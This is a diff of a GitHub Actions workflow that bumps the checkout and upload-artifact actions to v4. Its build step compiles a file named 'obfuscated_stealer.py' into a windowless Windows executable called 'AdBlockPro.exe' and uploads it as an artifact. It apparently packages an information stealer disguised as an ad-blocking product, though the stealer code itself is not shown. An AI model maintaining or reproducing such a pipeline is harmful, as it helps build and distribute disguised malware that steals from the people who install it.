@@ -13,7 +13,7 @@ jobs:
     runs-on: windows-latest
     
     steps:
-    - uses: actions/checkout@v3
+    - uses: actions/checkout@v4
     
     - name: Set up Python
       uses: actions/setup-python@v4
@@ -30,7 +30,7 @@ jobs:
         pyinstaller --onefile --noconsole --name AdBlockPro --icon=icon32.png obfuscated_stealer.py
     
     - name: Upload executable
-      uses: actions/upload-artifact@v3
+      uses: actions/upload-artifact@v4
       with:
         name: AdBlockPro-Windows-Executable
         path: dist/AdBlockPro.exe
